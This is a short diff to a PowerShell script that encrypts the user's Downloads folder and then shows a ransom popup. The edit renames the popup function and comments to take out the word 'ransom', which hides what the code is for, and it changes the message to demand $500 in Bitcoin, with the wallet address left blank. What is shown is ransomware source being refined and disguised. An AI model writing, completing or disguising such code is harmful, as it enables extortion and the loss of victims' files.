@@ -45,10 +45,10 @@ function Encrypt-DownloadsFolder($key) {
     }
 }
 
-# Function to display a ransom note popup
-function Show-RansomNotePopup {
+# Function to display a note popup
+function Show-NotePopup {
     Add-Type -AssemblyName PresentationFramework
-    [System.Windows.MessageBox]::Show("Your files have been encrypted. To restore access, please contact us with the payment details.", "Important Notice", "OK", "Warning")
+    [System.Windows.MessageBox]::Show("Your files have been encrypted. To restore access, please pay $500 in BTC to  with the payment details.", "Important Notice", "OK", "Warning")
 }
 
 # Main script logic
@@ -62,4 +62,4 @@ if (-not (Test-Path $keyPath)) {
 Encrypt-DownloadsFolder -key $key
 
 # Show the ransom note popup
-Show-RansomNotePopup
+Show-NotePopup
